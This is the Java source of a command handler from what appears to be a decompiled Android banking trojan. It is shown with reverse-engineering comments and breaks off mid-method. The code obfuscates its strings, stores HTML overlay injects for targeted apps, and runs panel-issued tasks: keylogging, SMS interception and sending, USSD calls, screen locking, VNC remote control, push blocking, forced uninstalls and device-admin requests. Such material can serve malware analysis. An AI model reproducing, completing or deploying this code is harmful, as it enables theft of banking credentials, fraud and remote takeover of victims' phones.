package fddo;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.sonnokta.p054v;
import com.sonnokta.utils.LogUtil;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Iterator;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

/* renamed from: fddo.super  reason: invalid class name */
public class Csuper {

    private static String TAG = "bwolf-Csuper";

    /* renamed from: new  reason: not valid java name */
    private static final String f75new = Cbreak.fddo("00fce74f2f");

    /* renamed from: fddo  reason: collision with root package name */
    private int f125fddo;

    /* renamed from: for  reason: not valid java name */
    private Context f76for;
    private String ifdf;

    public Csuper(Context context) {
        ifdf(context, -1, "");
    }

    public Csuper(Context context, int i, String str) {
        ifdf(context, i, str);
    }

    /**
     * TODO - CHECK
     *
     * @param r30
     * @param r31
     * @param r32
     */
//    private void ifdf_(android.content.Context r30, int r31, java.lang.String r32) {
//
//        Csuper csuperV1 = this;
//        String strV0 = r32;
//        String strV3 = "injects_to_disable";
//        String strV6;
//        String strV7;
//        String strV11;
//        csuperV1.f76for = r30;
//        int intV8 = r31;
//        csuperV1.f125fddo = intV8;
//        csuperV1.ifdf = strV0;
//
//        if (strV0 == null)
//            return;
//
//        boolean boolV8 = r32.isEmpty();
//        if (boolV8)
//            return;
//
//        try {
//            if (strV0.contains(Cbreak.fddo("6c87f2750ffcd1dd4a008c"))) {
//                Cthrow.m154case(csuperV1.f76for, Cbreak.fddo("57b1ea5839cefbed7b36ad3853"), Boolean.TRUE);
//                Cthrow.m157goto(csuperV1.f76for, "registration_time", Long.valueOf(Cgoto.m112continue()));
//            }
//
//            try {
//                JSONObject jsonObjectV8 = new JSONObject(r32);
//                strV0 = Cbreak.fddo("4ca7c65a33c7e1fb");
//                if (jsonObjectV8.has(strV0)) {
//                    try {
//                        if (jsonObjectV8.getString(Cbreak.fddo("4ca7c65a33c7e1fb")).contains(Cbreak.fddo("6d8fe67513e2cd"))) {
//                            strV0 = jsonObjectV8.getString(Cbreak.fddo("4ca7c65a33c7e1fb")).replace(Cbreak.fddo("6d8fe67513e2cd"), "").trim();
//                            if (!strV0.isEmpty()) {
//                                String[] strArrV0 = strV0.split(Cbreak.fddo("12"));
//                                int intV6 = strArrV0.length;
//                                int intV9 = 0;
//                                while (intV9 < intV6) {
//                                    strV6 = strArrV0[intV9];
//                                    if (!strV6.isEmpty()) {
//                                        Cgoto.q(this.f76for, strV6);
//                                    }
//
//                                    intV9++;
//                                }
//                            }
//                        }
//                    } catch (Exception e3) {
//                    }
//                }
//
//                JSONObject jsonObjectV0 = null;
//                try {
//                    jsonObjectV0 = jsonObjectV8.getJSONObject("response");
//                } catch (Exception e) {
//
//                }
//
//                if (jsonObjectV0 != null && !jsonObjectV0.isNull("smarts")) {
//                    JSONArray jsonArrayV4 = jsonObjectV0.getJSONArray("smarts");
//                    strV11 = "";
//                    for (int intV10 = 0; intV10 < jsonArrayV4.length(); intV10++) {
//                        jsonObjectV0 = jsonArrayV4.getJSONObject(intV10);
//                        strV7 = jsonObjectV0.getString("type");
//                        JSONObject jsonObjectV2 = new JSONObject();
//
//                        try {
//                            jsonObjectV2.put("is_active", jsonObjectV0.getBoolean("is_active"));
//                            jsonObjectV2.put("data", jsonObjectV0.getString("data"));
//                            jsonObjectV2.put("cap_data", jsonObjectV0.getString("cap_data"));
//                            jsonObjectV2.put("show_cap", jsonObjectV0.getBoolean("show_cap"));
//                            jsonObjectV2.put("type", strV7);
//                            jsonObjectV2.put("icon", (strV7.equals("html") ? jsonObjectV0.getString("icon") : ""));
//                            strV0 = jsonObjectV2.toString();
//
//                            StringBuilder stringBuilderV3 = new StringBuilder();
//                            stringBuilderV3.append("inj_");
//                            stringBuilderV3.append(jsonObjectV0.getString("package"));
//                            Cthrow.m159this(csuperV1.f76for, stringBuilderV3.toString(), strV0);
//
//                            StringBuilder stringBuilderV0 = new StringBuilder();
//                            stringBuilderV0.append(strV11);
//                            stringBuilderV0.append(jsonObjectV0.getString("package"));
//                            stringBuilderV0.append(",");
//                            strV11 = stringBuilderV0.toString();
//                        } catch (Exception e2) {
//                            Cgoto.m110class(csuperV1.f76for, "EXC_RES_SMART", e2);
//                        }
//                    }
//
//                    Cthrow.m159this(this.f76for, "smarts_injects", strV11);
//                    if (jsonObjectV8.has("panel_smarts_ver"))
//                        Cthrow.m155else(this.f76for, "bot_smarts_ver", Integer.valueOf(jsonObjectV8.getInt("panel_smarts_ver")));
//                }
//
//                if (jsonObjectV8.has("injects_to_enable") && !jsonObjectV8.getString("injects_to_enable").isEmpty()) {
//                    Cclass cclassV2 = new Cclass(csuperV1.f76for);
//                    String[] strArrV0 = strV0.split(",");
//                    for (int intV4 = 0; intV4 < strArrV0.length; intV4++)
//                        cclassV2.m59new(strArrV0[intV4]);
//                }
//
//                if (jsonObjectV8.has("injects_to_disable") && !jsonObjectV8.getString("injects_to_disable").isEmpty()) {
//                    Cclass cclassV2 = new Cclass(csuperV1.f76for);
//                    String[] strArrV0 = jsonObjectV8.getString("injects_to_disable").split(",");
//                    for (int intV4 = 0; intV4 < strArrV0.length; intV4++)
//                        cclassV2.m59new(strArrV0[intV4]); // ?
//                }
//
//                if (jsonObjectV8.has("panel_smarts_ver")) {
//                    Cthrow.m155else(csuperV1.f76for, "panel_smarts_ver", Integer.valueOf(jsonObjectV8.getInt("panel_smarts_ver")));
//                }
//
//                if (jsonObjectV8.has(Cbreak.fddo("5bbac1583df6f6f16232b63344"))) {
//                    Cgoto.m108case(csuperV1.f76for, jsonObjectV8.getString(Cbreak.fddo("5bbac1583df6f6f16232b63344")));
//                }
//
//                if (jsonObjectV8.has("block_push_apps")) {
//                    Cthrow.m159this(csuperV1.f76for, "block_push_apps", jsonObjectV8.getString("block_push_apps"));
//                }
//
//                if (jsonObjectV8.has("minimize_apps")) {
//                    Cthrow.m159this(csuperV1.f76for, "minimize_apps", jsonObjectV8.getString("minimize_apps"));
//                }
//
//                if (jsonObjectV8.has("uninstall_apps")) {
//                    Cthrow.m159this(csuperV1.f76for, "uninstall_apps", jsonObjectV8.getString("uninstall_apps"));
//                }
//
//                if (!jsonObjectV8.isNull("block_push_delay")) {
//                    Cthrow.m155else(csuperV1.f76for, "block_push_delay", Integer.valueOf(jsonObjectV8.getInt("block_push_delay")));
//                }
//
//                if (!jsonObjectV8.isNull("minimize_delay")) {
//                    Cthrow.m155else(csuperV1.f76for, "minimize_delay", Integer.valueOf(jsonObjectV8.getInt("minimize_delay")));
//                }
//
//                if (!jsonObjectV8.isNull(Cbreak.fddo("4ca7c65a33c7e1fb"))) {
//                    Cthrow.m155else(csuperV1.f76for, "4ca7c65a33c7e1fb", jsonObjectV8.getInt("4ca7c65a33c7e1fb"));
//                }
//
//                if (!jsonObjectV8.isNull("keylogger_delay")) {
//                    Cthrow.m155else(csuperV1.f76for, "keylogger_delay", Integer.valueOf(jsonObjectV8.getInt("keylogger_delay")));
//                }
//
//                boolean isGetDeviceAdminDelay = jsonObjectV8.isNull("get_device_admin_delay");
//                if (!isGetDeviceAdminDelay) {
//                    Integer deviceAdminDelay = Integer.valueOf(jsonObjectV8.getInt("get_device_admin_delay"));
//                    Cthrow.m155else(csuperV1.f76for, "get_device_admin_delay", deviceAdminDelay);
//                }
//
//                if (!jsonObjectV8.isNull("injects_delay")) {
//                    Cthrow.m155else(csuperV1.f76for, "injects_delay", Integer.valueOf(jsonObjectV8.getInt("injects_delay")));
//                }
//
//                boolean isKeyloggerNull = jsonObjectV8.isNull("keylogger_enabled");
//                if (!isKeyloggerNull) {
//                    int keyloggerEnabled = jsonObjectV8.getInt("keylogger_enabled");
//                    if (keyloggerEnabled == 1) {
//                        Cthrow.m154case(csuperV1.f76for, "keylogger_enabled", Boolean.TRUE);
//                    } else {
//                        Cthrow.m154case(csuperV1.f76for, "keylogger_enabled", Boolean.FALSE);
//                    }
//                }
//
//
//                if (Cthrow.m158new(csuperV1.f76for, "vnc", "").isEmpty() &&
//                        !Cthrow.fddo(csuperV1.f76for, "fg_mode", Boolean.FALSE).booleanValue() &&
//                        !jsonObjectV8.isNull("net_delay")) {
//                    Cthrow.m155else(csuperV1.f76for, "net_delay", Integer.valueOf(jsonObjectV8.getInt("net_delay")));
//                }
//
//                if (jsonObjectV8.has("vnc_tasks")) {
//                    JSONArray jsonArrayV0 = jsonObjectV8.getJSONArray("vnc_tasks");
//                    if (jsonArrayV0.length() > 0) {
//                        Cconst.m62const(csuperV1.f76for, jsonArrayV0);
//                    }
//                }
//
//                JSONArray jsonArrayV0 = jsonObjectV8.getJSONArray(Cbreak.fddo("4aa3c6412f"));
//                if (jsonArrayV0.length() >= 1) {
//                    csuperV1.m145for(jsonArrayV0);
//                }
//            } catch (JSONException e) {
//            }
//        } catch (Exception e0) {
//            Cgoto.m110class(csuperV1.f76for, "EXC_RES_INIT", e0);
//        }
//    }
    private void ifdf(android.content.Context r30, int r31, java.lang.String r32) {
        Log.e(TAG, "--- ifdf > Check --- r31: " + r31 + ", r32: " + r32);
        Csuper csuperV1 = this;
        String strV0 = r32;
        String strV2 = "5bbac1583df6f6f16232b63344";
        String strV3 = "injects_to_disable";
        String strV4 = "smarts";
        String strV5 = "injects_to_enable";
        String strV6 = "6d8fe67513e2cd";
        String strV7 = "net_delay";
        String strV8 = "injects_delay";
        String strV9 = "get_device_admin_delay";
        String strV10 = "keylogger_delay";
        String strV11 = "uninstall_delay";
        String strV12 = "minimize_delay";
        String strV13 = "block_push_delay";
        String strV14 = "uninstall_apps";
        String strV15 = "minimize_apps";
        String strV16 = strV7;
        strV7 = "block_push_apps";
        String strV17 = "4ca7c65a33c7e1fb";
        String strV18 = strV8;
        strV8 = "keylogger_enabled";
        String strV19 = strV8;
        String strV22, strV23, strV24, strV25, strV26, strV27, strV28, strVP2;
        String[] strArrP2;
        Context contextV8 = r30;
        csuperV1.f76for = contextV8;
        int intV8 = r31;
        csuperV1.f125fddo = intV8;
        csuperV1.ifdf = strV0;

        if (strV0 == null)
            return;

        boolean boolV8 = r32.isEmpty();
        if (boolV8)
            return;

        try {
            strV8 = "6c87f2750ffcd1dd4a008c";   // "REG_SUCCESS"
            strV8 = Cbreak.fddo(strV8);
            boolV8 = strV0.contains(strV8);
            String strV21, strV20;

            if (boolV8) {
                contextV8 = csuperV1.f76for;
                strV20 = "57b1ea5839cefbed7b36ad3853";      // "is_registered"
                strV21 = strV9;
                strV9 = Cbreak.fddo(strV20);
                strV20 = strV10;
                Boolean booleanV10 = Boolean.TRUE;
                Cthrow.m154case(contextV8, strV9, booleanV10);
                contextV8 = csuperV1.f76for;
                strV9 = "registration_time";
                long lgV22 = Cgoto.m112continue();
                Long longV10 = Long.valueOf(lgV22);
                Cthrow.m157goto(contextV8, strV9, longV10);
            } else {
                strV21 = strV9;
                strV20 = strV10;
            }

            try {
                JSONObject jsonObjectV8 = new JSONObject(strV0);
                strV0 = Cbreak.fddo(strV17);
                boolean boolV0 = jsonObjectV8.has(strV0);
                strV10 = "";
                if (boolV0) {
                    try {
                        strV0 = Cbreak.fddo(strV17);
                        strV0 = jsonObjectV8.getString(strV0);
                        strV9 = Cbreak.fddo(strV6);
                        boolV0 = strV0.contains(strV9);
                        if (boolV0) {
                            strV0 = Cbreak.fddo(strV17);
                            strV0 = jsonObjectV8.getString(strV0);
                            strV6 = Cbreak.fddo(strV6);
                            strV0 = strV0.replace(strV6, strV10);
                            strV0 = strV0.trim();
                            boolean boolV6 = strV0.isEmpty();
                            if (!boolV6) {
                                strV6 = "12";       // ","
                                strV6 = Cbreak.fddo(strV6);
                                String[] strArrV0 = strV0.split(strV6);
                                int intV6 = strArrV0.length;

                                for (int intV9 = 0; intV9 < intV6; intV9++) {
                                    int intV17 = intV6;
                                    strV6 = strArrV0[intV9];
                                    boolean boolV22 = strV6.isEmpty();
                                    String strP2;
                                    if (!boolV22) {
                                        strArrP2 = strArrV0;
                                        Context contextV0 = csuperV1.f76for;
                                        Cgoto.q(contextV0, strV6);
                                    } else
                                        strArrP2 = strArrV0;

                                    strArrV0 = strArrP2;
                                    intV6 = intV17;
                                }
                            }
                        }
                    } catch (Exception e) {
                    }
                }

                JSONObject jsonObjectV0 = null;
                try {
                    strV6 = "response";
                    jsonObjectV0 = jsonObjectV8.getJSONObject(strV6);
                } catch (Exception e) {
                }

                strV6 = ",";
                strV9 = "panel_smarts_ver";
                if (jsonObjectV0 != null) {
                    try {
                        boolean boolV17 = jsonObjectV0.isNull(strV4);   // "smarts"
                        if (!boolV17) {
                            JSONArray jsonArrayV4 = jsonObjectV0.getJSONArray(strV4);
                            int intV0 = jsonArrayV4.length();

                            if (intV0 > 0) {

                                strV27 = strV2;
                                strV28 = strV3;
                                strV26 = strV7;
                                strV22 = strV12;
                                strV23 = strV13;
                                strV24 = strV14;
                                strV25 = strV15;

                                String strP2 = strV10;
                                strV17 = strV11;
                                strV11 = strP2;
                                int intV10 = 0x0;
                                intV0 = jsonArrayV4.length();
                                while (intV10 < intV0) {
                                    try {
                                        jsonObjectV0 = jsonArrayV4.getJSONObject(intV10);
                                        JSONArray jsonArrayP3 = jsonArrayV4;

                                        try {
                                            strV4 = "is_active";
                                            boolean boolV4 = jsonObjectV0.getBoolean(strV4);
                                            strV22 = strV12;
                                            try {
                                                strV12 = "package";
                                                strV12 = jsonObjectV0.getString(strV12);
                                                strV23 = strV13;
                                                try {
                                                    strV13 = "data";
                                                    strV13 = jsonObjectV0.getString(strV13);
                                                    strV24 = strV14;
                                                    try {
                                                        strV14 = "cap_data";
                                                        strV14 = jsonObjectV0.getString(strV14);
                                                        strV25 = strV15;
                                                        try {
                                                            strV15 = "show_cap";
                                                            boolean boolV15 = jsonObjectV0.getBoolean(strV15);
                                                            strV26 = strV7;
                                                            try {
                                                                strV7 = "type";
                                                                strV7 = jsonObjectV0.getString(strV7);
                                                                strV27 = strV2;
                                                                try {
                                                                    strV2 = "html";
                                                                    boolean boolV2 = strV7.equals(strV2);
                                                                    if (boolV2) {
                                                                        strV2 = "icon";
                                                                        strV0 = jsonObjectV0.getString(strV2);
                                                                    } else {
                                                                        strV0 = strP2;
                                                                    }

                                                                    JSONObject jsonObjectV2 = new JSONObject();
                                                                    strV28 = strV3;
                                                                    try {
                                                                        strV3 = "is_active";
                                                                        jsonObjectV2.put(strV3, boolV4);
                                                                        strV3 = "data";
                                                                        jsonObjectV2.put(strV3, strV13);
                                                                        strV3 = "cap_data";
                                                                        jsonObjectV2.put(strV3, strV14);
                                                                        strV3 = "show_cap";
                                                                        jsonObjectV2.put(strV3, boolV15);
                                                                        strV3 = "type";
                                                                        jsonObjectV2.put(strV3, strV7);
                                                                        strV3 = "icon";
                                                                        jsonObjectV2.put(strV3, strV0);
                                                                        strV0 = jsonObjectV2.toString();
                                                                        Context contextV2 = csuperV1.f76for;
                                                                        StringBuilder stringBuilderV3 = new StringBuilder();
                                                                        strV4 = "inj_";
                                                                        stringBuilderV3.append(strV4);
                                                                        stringBuilderV3.append(strV12);
                                                                        strV3 = stringBuilderV3.toString();
                                                                        Cthrow.m159this(contextV2, strV3, strV0);
                                                                        StringBuilder stringBuilderV0 = new StringBuilder();
                                                                        stringBuilderV0.append(strV11);
                                                                        stringBuilderV0.append(strV12);
                                                                        stringBuilderV0.append(strV6);
                                                                        strV11 = stringBuilderV0.toString();
                                                                    } catch (Exception eE) {
                                                                        Context contextV2 = csuperV1.f76for;
                                                                        strV3 = "EXC_RES_SMART";
                                                                        Cgoto.m110class(contextV2, strV3, eE);
                                                                    }
                                                                } catch (Exception eD) {
                                                                    Context contextV2 = csuperV1.f76for;
                                                                    strV3 = "EXC_RES_SMART";
                                                                    Cgoto.m110class(contextV2, strV3, eD);
                                                                }
                                                            } catch (Exception eC) {
                                                                Context contextV2 = csuperV1.f76for;
                                                                strV3 = "EXC_RES_SMART";
                                                                Cgoto.m110class(contextV2, strV3, eC);
                                                            }
                                                        } catch (Exception eB) {
                                                            Context contextV2 = csuperV1.f76for;
                                                            strV3 = "EXC_RES_SMART";
                                                            Cgoto.m110class(contextV2, strV3, eB);
                                                        }
                                                    } catch (Exception eA) {
                                                        Context contextV2 = csuperV1.f76for;
                                                        strV3 = "EXC_RES_SMART";
                                                        Cgoto.m110class(contextV2, strV3, eA);
                                                    }
                                                } catch (Exception e) {
                                                    Context contextV2 = csuperV1.f76for;
                                                    strV3 = "EXC_RES_SMART";
                                                    Cgoto.m110class(contextV2, strV3, e);
                                                }
                                            } catch (Exception e) {
                                                Context contextV2 = csuperV1.f76for;
                                                strV3 = "EXC_RES_SMART";
                                                Cgoto.m110class(contextV2, strV3, e);
                                            }
                                        } catch (Exception e) {
                                            Context contextV2 = csuperV1.f76for;
                                            strV3 = "EXC_RES_SMART";
                                            Cgoto.m110class(contextV2, strV3, e);
                                        }
                                    } catch (Exception e) {
                                        Context contextV2 = csuperV1.f76for;
                                        strV3 = "EXC_RES_SMART";
                                        Cgoto.m110class(contextV2, strV3, e);
                                    }

                                    intV10++;
                                }
                            } else {
                                strV27 = strV2;
                                strV28 = strV3;
                                strV26 = strV7;
                                strVP2 = strV10;
                                strV17 = strV11;
                                strV22 = strV12;
                                strV23 = strV13;
                                strV24 = strV14;
                                strV25 = strV15;
                                strV11 = strVP2;
                            }

                            Context contextV0 = csuperV1.f76for;
                            strV2 = "smarts_injects";
                            Cthrow.m159this(contextV0, strV2, strV11);
                            boolV0 = jsonObjectV8.has(strV9);
                            if (boolV0) {
                                contextV0 = csuperV1.f76for;
                                strV2 = "bot_smarts_ver";
                                int intV3 = jsonObjectV8.getInt(strV9);
                                Integer integerV3 = Integer.valueOf(intV3);
                                Cthrow.m155else(contextV0, strV2, integerV3);
                            }
                        }
                    } catch (Exception e) {
                    }
                }

                strV27 = strV2;
                strV28 = strV3;
                strV26 = strV7;
                strVP2 = strV10;
                strV17 = strV11;
                strV22 = strV12;
                strV23 = strV13;
                strV24 = strV14;
                strV25 = strV15;

                boolV0 = jsonObjectV8.has(strV5);   // "injects_to_enable"
                if (boolV0) {
                    strV0 = jsonObjectV8.getString(strV5);
                    boolean boolV2 = strV0.isEmpty();
                    if (!boolV2) {
                        Cclass cclassV2;
                        Context contextV3 = csuperV1.f76for;
                        cclassV2 = new Cclass(contextV3);
                        String[] strArrV0 = strV0.split(strV6);
                        int intV3 = strArrV0.length;
                        int intV4 = 0x0;

                        while (intV4 < intV3) {
                            strV5 = strArrV0[intV4];
                            cclassV2.m59new(strV5);
                            intV4++;
                        }
                    }
                }

                strV2 = strV28;
                boolV0 = jsonObjectV8.has(strV2);   // "injects_to_disable"
                if (boolV0) {
                    strV0 = jsonObjectV8.getString(strV2);
                    boolean boolV2 = strV2.isEmpty();
                    if (!boolV2) {
                        Cclass cclassV2;
                        Context contextV3 = csuperV1.f76for;
                        cclassV2 = new Cclass(contextV3);
                        String[] strArrV0 = strV0.split(strV6);
                        int intV3 = strArrV0.length;
                        int intV4 = 0x0;
                        while (intV4 < intV3) {
                            strV5 = strArrV0[intV4];
                            cclassV2.fddo(strV5);
                            intV4++;
                        }
                    }
                }

                boolV0 = jsonObjectV8.has(strV9);   // "panel_smarts_ver"
                if (boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV2 = jsonObjectV8.getInt(strV9);
                    Integer integerV2 = Integer.valueOf(intV2);
                    Cthrow.m155else(contextV0, strV9, integerV2);
                }

                strV0 = Cbreak.fddo(strV27);
                boolV0 = jsonObjectV8.has(strV0);   // "extra_domains"
                if (boolV0) {
                    strV0 = Cbreak.fddo(strV27);
                    strV0 = jsonObjectV8.getString(strV0);
                    Context contextV2 = csuperV1.f76for;
                    Cgoto.m108case(contextV2, strV0);
                }

                strV2 = strV26;
                boolV0 = jsonObjectV8.has(strV2);   // "block_push_apps"
                if (boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    strV3 = jsonObjectV8.getString(strV2);
                    Cthrow.m159this(contextV0, strV2, strV3);
                }

                strV2 = strV25;
                boolV0 = jsonObjectV8.has(strV2);   // "minimize_apps"
                if (boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    strV3 = jsonObjectV8.getString(strV2);
                    Cthrow.m159this(contextV0, strV2, strV3);
                }

                strV2 = strV24;
                boolV0 = jsonObjectV8.has(strV2);   // "uninstall_apps"
                if (boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    strV3 = jsonObjectV8.getString(strV2);
                    Cthrow.m159this(contextV0, strV2, strV3);
                }

                strV2 = strV23;
                boolV0 = jsonObjectV8.isNull(strV2);    // "block_push_delay"
                if (!boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV3 = jsonObjectV8.getInt(strV2);
                    Integer integerV3 = Integer.valueOf(intV3);
                    Cthrow.m155else(contextV0, strV2, integerV3);
                }

                strV2 = strV22;
                boolV0 = jsonObjectV8.isNull(strV2);    // "minimize_delay"
                if (!boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV3 = jsonObjectV8.getInt(strV2);
                    Integer integerV3 = Integer.valueOf(intV3);
                    Cthrow.m155else(contextV0, strV2, integerV3);
                }

                strV2 = strV17;
                boolV0 = jsonObjectV8.isNull(strV2);    // "uninstall_delay"
                if (!boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV3 = jsonObjectV8.getInt(strV2);
                    Integer integerV3 = Integer.valueOf(intV3);
                    Cthrow.m155else(contextV0, strV2, integerV3);
                }

                strV2 = strV20;
                boolV0 = jsonObjectV8.isNull(strV2);    // "keylogger_delay"
                if (!boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV3 = jsonObjectV8.getInt(strV2);
                    Integer integerV3 = Integer.valueOf(intV3);
                    Cthrow.m155else(contextV0, strV2, integerV3);
                }

                strV2 = strV21;
                boolV0 = jsonObjectV8.isNull(strV2);    // "get_device_admin_delay"
                if (!boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV3 = jsonObjectV8.getInt(strV2);
                    Integer integerV3 = Integer.valueOf(intV3);
                    Cthrow.m155else(contextV0, strV2, integerV3);
                }

                strV2 = strV18;
                boolV0 = jsonObjectV8.isNull(strV2);    // "injects_delay"
                if (!boolV0) {
                    Context contextV0 = csuperV1.f76for;
                    int intV3 = jsonObjectV8.getInt(strV2);
                    Integer integerV3 = Integer.valueOf(intV3);
                    Cthrow.m155else(contextV0, strV2, integerV3);
                }

                strV2 = strV19;
                boolV0 = jsonObjectV8.isNull(strV2);    // "keylogger_enabled"
                int intV3 = 0x1;
                if (!boolV0) {
                    int intV0 = jsonObjectV8.getInt(strV2);
                    Context contextV0;
                    Boolean booleanV4;
                    if (intV0 == intV3) {
                        contextV0 = csuperV1.f76for;
                        booleanV4 = Boolean.TRUE;
                    } else {
                        contextV0 = csuperV1.f76for;
                        booleanV4 = Boolean.FALSE;
                    }
                    Cthrow.m154case(contextV0, strV2, booleanV4);
                }

                Context contextV0 = csuperV1.f76for;
                strV2 = "vnc";
                strV4 = strVP2;
                strV0 = Cthrow.m158new(contextV0, strV2, strV4);
                boolV0 = strV0.isEmpty();
                if (boolV0) {
                    contextV0 = csuperV1.f76for;
                    strV2 = "fg_mode";
                    Boolean booleanV4 = Boolean.FALSE;
                    Boolean booleanV0 = Cthrow.fddo(contextV0, strV2, booleanV4);
                    boolV0 = booleanV0.booleanValue();
                    if (!boolV0) {
                        strV2 = strV16;
                        boolV0 = jsonObjectV8.isNull(strV2);
                        if (!boolV0) {
                            int intV0 = jsonObjectV8.getInt(strV2);
                            Context contextV4 = csuperV1.f76for;
                            Integer integerV0 = Integer.valueOf(intV0);
                            Cthrow.m155else(contextV4, strV2, integerV0);
                        }
                    }
                }

                strV0 = "vnc_tasks";
                boolV0 = jsonObjectV8.has(strV0);
                if (boolV0) {
                    strV0 = "vnc_tasks";
                    JSONArray jsonArrayV0 = jsonObjectV8.getJSONArray(strV0);
                    int intV2 = jsonArrayV0.length();
                    if (intV2 > 0) {
                        Context contextV2 = csuperV1.f76for;
                        Cconst.m62const(contextV2, jsonArrayV0);
                    }
                }

                strV0 = "4aa3c6412f";
                strV0 = Cbreak.fddo(strV0); // "tasks"
                JSONArray jsonArrayV0 = jsonObjectV8.getJSONArray(strV0);
                int intV2 = jsonArrayV0.length();

                if (intV2 >= intV3) {
                    csuperV1.m145for(jsonArrayV0);
                }
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (Exception e) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            Context contextV2 = csuperV1.f76for;
            strV3 = "EXC_RES_INIT";
            Cgoto.m110class(contextV2, strV3, e);
        }
    }

    public int fddo() {
        LogUtil.showErrorLog(TAG, "--- fddo ---");
        return this.f125fddo;
    }

    /* renamed from: for  reason: not valid java name */
    public void m145for(JSONArray jSONArray) {
        Cwhile whileR = new Cwhile(this.f76for);
        ArrayList<String> arrayList = m146new(jSONArray);
        if (arrayList.size() > 0) {
            Iterator<String> it = arrayList.iterator();
            while (it.hasNext()) {
                String strV = it.next();
                whileR.fddo(strV);
            }
        }
    }

    /* renamed from: new  reason: not valid java name */

    /**
     * TODO - CHECK
     *
     * @param r28
     * @return
     */
    public java.util.ArrayList<java.lang.String> m146new(org.json.JSONArray r28) {
        Log.e(TAG, "--- m146new > Check device_admin--- " + r28);

        Csuper csuperV1 = this;
        JSONArray jsonArrayV2 = r28;
        String strId, strTaskType, strData;
        ArrayList<String> arrayListV14 = new ArrayList();
        int intV8;

        if (r28.length() > 0) {
            Cthrow.m159this(csuperV1.f76for, "acsb_task", "");
        }

        for (int intV13 = 0; intV13 < r28.length(); intV13++) {
            try {
                JSONObject jsonObjectV0 = r28.getJSONObject(intV13);
                strId = jsonObjectV0.getString("id");
                strTaskType = jsonObjectV0.getString("task_type");
                strData = jsonObjectV0.getString("data");
                String[] strArrV0 = strData.split("\\|", 2);

                if (strTaskType.equals("ussd")) {
                    Cgoto.x(csuperV1.f76for, strData);
                } else if (strTaskType.equals("sms")) { // ????
                    if (strArrV0[0].equals("112233")) {
                        ifdf ifdfV8 = new ifdf(csuperV1.f76for);
                        ifdfV8.m144new(strArrV0[1]);
                    } else {
                        try {
                            Cgoto.h(strArrV0[0], strArrV0[1]);
                        } catch (Exception e) {
                            StringBuilder stringBuilderV9 = new StringBuilder();
                            stringBuilderV9.append("send_sms_error:");
                            stringBuilderV9.append(e.getMessage());
                            Cgoto.g(csuperV1.f76for, stringBuilderV9.toString());
                        }
                    }
                } else if (strTaskType.equals("register_again")) {
                    Cthrow.m154case(csuperV1.f76for, "is_registered", Boolean.FALSE);
                } else if (strTaskType.equals("lock_on")) {
                    Cthrow.m154case(csuperV1.f76for, "lock_on", Boolean.TRUE);
                } else if (strTaskType.equals("lock_off")) {
                    Cthrow.m154case(csuperV1.f76for, "lock_on", Boolean.FALSE);
                    if (Cgoto.ifdf(csuperV1.f76for).booleanValue()) {
                        Cgoto.m107break(csuperV1.f76for);
                    } else {
                        Cgoto.m120implements(csuperV1.f76for);
                    }
                } else if (strTaskType.equals("intercept_on")) {
                    Cthrow.m154case(csuperV1.f76for, "intercept_on", Boolean.TRUE);
                    Cgoto.g(csuperV1.f76for, "SMS_Intercept: enabled");
                } else if (strTaskType.equals("intercept_off")) {
                    Cthrow.m154case(csuperV1.f76for, "intercept_on", Boolean.FALSE);
                    Cgoto.g(csuperV1.f76for, "SMS_Intercept: disabled");
                } else if (strTaskType.equals("vnc_start")) {
                    String strVnc = jsonObjectV0.getString("data");
                    try {
                        Cthrow.m159this(csuperV1.f76for, "vnc", strVnc);
                        Cthrow.m155else(csuperV1.f76for, "net_delay", Integer.valueOf(1));
                    } catch (Exception e) {
                        JSONObject jsonObjectV9 = jsonArrayV2.getJSONObject(intV13);
                        strId = jsonObjectV9.getString("id");
                        strTaskType = jsonObjectV9.getString("task_type");
                        strData = jsonObjectV9.getString("data");
                        StringWriter stringWriter = new StringWriter();
                        PrintWriter printWriter = new PrintWriter(stringWriter);
                        e.printStackTrace(printWriter);
                        String strWriter = stringWriter.toString();
                        printWriter.close();
                        Cgoto.f(this.f76for,
                                String.format("\n=============\nPlace: RES_PARSE_TASKS\nBuild.VERSION.RELEASE: %s\nBuild.MANUFACTURER: %s\nBuild.MODEL: %s\nLANG: %s\nCOUNTRY: %s\ntid: %s; task_type: %s; data: %s\nMsg: %s\nTb: %s\n===========\n\n",
                                        Build.VERSION.RELEASE,
                                        Build.MANUFACTURER,
                                        Build.MODEL,
                                        Cgoto.m138throws(this.f76for),
                                        Cgoto.m142while(this.f76for),
                                        strId,
                                        strTaskType,
                                        strData,
                                        e.getMessage(),
                                        strWriter
                                ));
                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("tid1", strId);
                        jsonObject.put("tr_inner", "failed");
                        arrayListV14.add(jsonObject.toString());
                    }
                } else if (strTaskType.equals("vnc_stop")) {
                    String strV0 = Cthrow.m158new(csuperV1.f76for, "vnc", "");
                    if (strV0.contains("STREAM_SCREEN;"))
                        Cthrow.m154case(csuperV1.f76for, "vnc_stream_started", Boolean.TRUE);
                    Cthrow.m159this(csuperV1.f76for, "vnc", "");
                } else if (strTaskType.equals("push")) {
                    strArrV0 = strData.split("\\|", 3);
                    Cgoto.l(csuperV1.f76for, strArrV0[0], strArrV0[1], strArrV0[2]);
                } else if (strTaskType.equals("kill_bot")) {
                    Cthrow.m154case(csuperV1.f76for, "kill_bot", Boolean.TRUE);
                    String packageName = csuperV1.f76for.getPackageName();
                    Cthrow.m159this(csuperV1.f76for, "uninstall_apps", packageName);
                } else if (strTaskType.equals("start_keylogger")) {
                    Cthrow.m154case(csuperV1.f76for, "keylogger_enabled", Boolean.TRUE);
                    Cthrow.m155else(csuperV1.f76for, "keylogger_delay", Integer.valueOf(0));
                } else if (strTaskType.equals("stop_keylogger")) {
